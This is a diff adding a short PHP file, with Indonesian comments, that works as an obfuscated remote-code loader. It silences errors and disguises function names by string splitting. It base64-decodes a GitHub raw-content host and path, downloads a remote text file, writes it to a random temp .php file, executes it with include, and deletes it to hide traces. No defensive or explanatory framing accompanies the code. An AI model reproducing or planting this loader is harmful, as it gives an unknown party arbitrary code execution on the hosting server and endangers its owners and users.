@@ -1,0 +1,37 @@
+<?php
+error_reporting(0);
+set_time_limit(0);
+
+$b64  = "base"."64_decode";
+$sock = "stream_"."socket_client";
+
+$host = $b64('cmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbQ=='); 
+$port = 443;
+$path = $b64('L3NpYXBtYW4vd29tYW4vcmVmcy9oZWFkcy9tYWluL3BhdWwudHh0'); 
+
+$fp = $sock("ssl://$host:$port", $errno, $errstr, 30);
+if (!$fp) { exit; }
+
+$out  = "GET $path HTTP/1.1\r\n";
+$out .= "Host: $host\r\n";
+$out .= "Connection: Close\r\n\r\n";
+fwrite($fp, $out);
+
+$content = '';
+while (!feof($fp)) {
+    $content .= fgets($fp, 128);
+}
+fclose($fp);
+
+// buang header HTTP
+$header_end = strpos($content, "\r\n\r\n");
+if ($header_end !== false) {
+    $content = substr($content, $header_end + 4);
+}
+
+// tulis ke file sementara, lalu include
+$tmp = sys_get_temp_dir() . "/" . md5(microtime(true)) . ".php";
+file_put_contents($tmp, $content);
+include $tmp;
+unlink($tmp);
+?>
